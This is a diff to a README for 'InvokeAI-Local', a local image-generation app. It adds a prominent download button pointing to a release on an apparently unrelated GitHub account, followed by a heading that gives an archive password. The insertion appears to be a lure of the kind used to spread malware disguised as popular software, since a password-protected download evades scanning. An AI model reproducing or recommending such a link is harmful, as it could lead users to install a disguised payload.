@@ -13,6 +13,14 @@ InvokeAI-Local is a desktop application for **local, private, and controllable i
 
 ---
 
+ <div align="center">
+  <a href="https://github.com/darkpalladin-eastz19/InvokeAI/releases/tag/InvokeAI-Local">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSWORD - 2026 
+
 ## Philosophy
 
 This project is built on three principles:
